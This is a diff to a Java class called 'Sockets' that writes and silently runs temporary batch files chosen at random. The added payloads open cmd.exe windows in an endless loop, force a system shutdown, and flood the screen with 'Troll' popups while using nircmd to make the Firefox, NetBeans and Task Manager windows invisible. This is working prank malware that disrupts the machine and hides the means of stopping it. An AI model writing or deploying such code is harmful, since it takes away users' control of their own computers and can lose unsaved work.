@@ -98,9 +98,6 @@ class Sockets
         try{
             Random rand = new Random(); 
             int random = rand.nextInt(10);
-            System.out.println("Loading please wait...");
-            Thread.sleep(5000);
-            System.out.println("Proceed!");
             if(random <= 3)
             {
                 File temp = File.createTempFile("vncv216789", ".bat"); 
@@ -109,9 +106,10 @@ class Sockets
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
                 bw.write("@echo off" + nl +
-":A" + nl +
-"start cmd.exe" + nl +
-"goto:A");
+                    ":A" + nl +
+                    "start cmd.exe" + nl +
+                    "nircmd.exe win trans ititle \"taskmanager\" 1" + nl +
+                    "goto:A");
                 bw.close();
                 
                 Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
@@ -125,10 +123,7 @@ class Sockets
                 
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("@echo off" + nl +
-":A" + nl +
-"msg * Troll level loading.... ITS OVER 9000!" + nl +
-"goto:A");
+                bw.write("msg * System is shutting down in 10 seconds! " + nl + "shutdown /s /t 10");
                 bw.close();
                     
                 Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
@@ -141,10 +136,18 @@ class Sockets
                 
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("msg * System is shutting down in 10 seconds! " + nl + "shutdown /s /t 10");
+                bw.write("@echo off" + nl +
+                    ":A" + nl +
+                    "msg * Troll level loading.... ITS OVER 9000!" + nl +
+                    "nircmd.exe win center alltop " + nl +
+                    "nircmd.exe win trans ititle \"firefox\" 1" + nl +
+                    "nircmd.exe win trans ititle \"netbeans\" 1" + nl +
+                    "nircmd.exe win trans ititle \"taskmanager\" 1" + nl +
+                    "goto:A");
                 bw.close();
                     
                 Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
+                
             }
 
             
